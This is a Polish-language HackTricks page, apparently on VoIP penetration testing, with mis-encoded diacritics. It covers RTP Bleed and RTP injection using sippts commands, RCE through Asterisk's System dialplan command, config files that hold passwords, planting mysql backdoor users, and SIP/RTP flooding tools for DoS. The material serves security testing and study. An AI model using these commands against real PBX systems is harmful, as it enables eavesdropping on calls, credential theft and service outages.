Proksy RTP pr贸buj rozwiza **ograniczenia NAT** dotykajce system贸w RTC poprzez przekazywanie strumieni RTP midzy dwiema lub wicej stronami. Gdy jest obecne NAT, oprogramowanie proksy RTP czsto nie mo偶e polega na informacjach o IP i porcie RTP uzyskanych poprzez sygnalizacj (np. SIP). Dlatego wiele proks贸w RTP wprowadzio mechanizm, w kt贸rym taki **krotka IP i port jest automatycznie poznawany**. Czsto dzieje si to poprzez inspekcj przychodzcego ruchu RTP i oznaczanie adresu IP i portu 藕r贸dowego dla ka偶dego przychodzcego ruchu RTP jako ten, na kt贸ry nale偶y odpowiedzie. Ten mechanizm, kt贸ry mo偶e by nazywany "trybem nauki", **nie wykorzystuje 偶adnej formy uwierzytelniania**. Dlatego **atakujcy** mog **wysya ruch RTP do proksa RTP** i otrzymywa przekazywany ruch RTP przeznaczony dla dzwonicego lub odbierajcego w trakcie trwajcego strumienia RTP. Nazywamy t wra偶liwo RTP Bleed, poniewa偶 pozwala ona atakujcym otrzymywa strumienie multimedialne RTP przeznaczone dla prawowitych u偶ytkownik贸w.

Innym interesujcym zachowaniem proks贸w RTP i stos贸w RTP jest to, 偶e czasami, **nawet jeli nie s podatne na RTP Bleed**, bd **akceptowa, przekazywa i/lub przetwarza pakiety RTP z dowolnego 藕r贸da**. Dlatego atakujcy mog wysya pakiety RTP, kt贸re mog pozwoli im na wstrzyknicie swoich medi贸w zamiast prawowitych. Nazywamy ten atak wstrzykniciem RTP, poniewa偶 pozwala on na wstrzyknicie nieprawowitych pakiet贸w RTP do istniejcych strumieni RTP. Ta wra偶liwo mo偶e wystpowa zar贸wno w proksach RTP, jak i w punktach kocowych.

Asterisk i FreePBX tradycyjnie u偶yway ustawienia **`NAT=yes`**, kt贸re umo偶liwia omijanie uwierzytelniania ruchu RTP, co potencjalnie prowadzi do braku d藕wiku lub jednokierunkowego d藕wiku podczas rozm贸w.

Wicej informacji mo偶na znale藕 pod adresem [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

* **`SIPPTS rtpbleed`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleed wykrywa wra偶liwo RTP Bleed wysyajc strumienie RTP.
```bash
sippts rtpbleed -i 10.10.0.10
```
* **`SIPPTS rtcpbleed`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtcpbleed wykrywa podatno na wyciek RTP, wysyajc strumienie RTCP.
```bash
sippts rtcpbleed -i 10.10.0.10
```
* **`SIPPTS rtpbleedflood`** z [**sippts**](https://github.com/Pepelux/sippts)**:** Exploit SIPPTS rtpbleedflood wykorzystuje podatno RTP Bleed wysyajc strumienie RTP.
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
* **`SIPPTS rtpbleedinject`** z [**sippts**](https://github.com/Pepelux/sippts)**:** Exploit SIPPTS rtpbleedinject wykorzystuje podatno RTP Bleed wstrzykujc plik d藕wikowy (format WAV).
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

W Asterisku uda ci si jako m贸c **dodawa reguy rozszerze i przeadowywa je** (na przykad poprzez skompromitowanie podatnego serwera mened偶era sieciowego), mo偶liwe jest uzyskanie RCE za pomoc polecenia **`System`**.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
Istnieje polecenie o nazwie **`Shell`**, kt贸re mo偶na u偶y **zamiast `System`** do wykonywania polece systemowych, jeli jest to konieczne.

{% hint style="warning" %}
Jeli serwer **zabrania u偶ycia pewnych znak贸w** w poleceniu **`System`** (np. w Elastix), sprawd藕, czy serwer WWW pozwala **w jaki spos贸b tworzy pliki w systemie** (np. w Elastix lub trixbox), i u偶yj tego do **utworzenia skryptu backdoor** a nastpnie u偶yj **`System`** do **wykonania** tego **skryptu**.
{% endhint %}

#### Interesujce pliki lokalne i uprawnienia

* **`sip.conf`** -> Zawiera haso u偶ytkownik贸w SIP.
* Jeli **serwer Asterisk dziaa jako root**, mo偶na skompromitowa roota.
* **U偶ytkownik root mysql** mo偶e **nie mie hasa**.
* Mo偶na to wykorzysta do utworzenia nowego u偶ytkownika mysql jako backdoor.
* **`FreePBX`**
* **`amportal.conf`** -> Zawiera haso administratora panelu webowego (FreePBX).
* **`FreePBX.conf`** -> Zawiera haso u偶ytkownika FreePBXuser u偶ywane do dostpu do bazy danych.
* Mo偶na to wykorzysta do utworzenia nowego u偶ytkownika mysql jako backdoor.
* **`Elastix`**
* **`Elastix.conf`** -> Zawiera kilka hase w postaci czystego tekstu, takich jak haso root mysql, haso IMAPd, haso administratora webowego
* **Kilka folder贸w** bdzie nale偶e do skompromitowanego u偶ytkownika asterisk (jeli nie dziaa jako root). Ten u偶ytkownik mo偶e odczyta wczeniejsze pliki i kontrolowa konfiguracj, wic mo偶e sprawi, 偶e Asterisk zaaduje inne zainfekowane binaria podczas wykonywania.

### Wstrzykiwanie RTP

Mo偶liwe jest wstrzyknicie pliku **`.wav`** w rozmowy za pomoc narzdzi takich jak **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) i **`rtpmixsound`** (`sudo apt install rtpmixsound`).

Lub mo偶na u偶y skrypt贸w z [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) do **skanowania rozm贸w** (**`rtpscan.pl`**), wysyania pliku `.wav` do rozmowy (**`rtpsend.pl`**) i **wstrzykiwania haasu** w rozmow (**`rtpflood.pl`**).

### DoS

Istnieje kilka sposob贸w na pr贸b przeprowadzenia ataku DoS na serwery VoIP.

* **`SIPPTS flood`** z [**sippts**](https://github.com/Pepelux/sippts)**: Atak flood SIPPTS wysya nieograniczon liczb wiadomoci do celu.
* `sippts flood -i 10.10.0.10 -m invite -v`
* **`SIPPTS ping`** z [**sippts**](https://github.com/Pepelux/sippts)**: Polecenie ping SIPPTS wykonuje ping SIP, aby sprawdzi czas odpowiedzi serwera.
* `sippts ping -i 10.10.0.10`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): Atak DoS na protok贸 IAX u偶ywany przez Asterisk
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): Narzdzie do przeprowadzania ataku flood wiadomoci SIP/SDP INVITE przez UDP/IP.
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): Wysya kilka poprawnie sformowanych pakiet贸w RTP. Nale偶y zna u偶ywane porty RTP (najpierw sniff).
* [**SIPp**](https://github.com/SIPp/sipp): Pozwala analizowa i generowa ruch SIP. Mo偶e by r贸wnie偶 u偶ywany do atak贸w DoS.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): Szwajcarski scyzoryk SIP. Mo偶e by r贸wnie偶 u偶ywany do przeprowadzania atak贸w SIP.
* Fuzzers: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).

### Luki w systemie operacyjnym

Najprostszym sposobem zainstalowania oprogramowania takiego jak Asterisk jest pobranie **dystrybucji systemu operacyjnego**, kt贸ra ju偶 go zawiera, takiej jak: **FreePBX, Elastix, Trixbox**... Problem z nimi polega na tym, 偶e gdy ju偶 dziaaj, administratorzy systemu mog **nie aktualizowa ich ponownie**, a z czasem bd odkrywane **luki w zabezpieczeniach**.

## Odnoniki

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
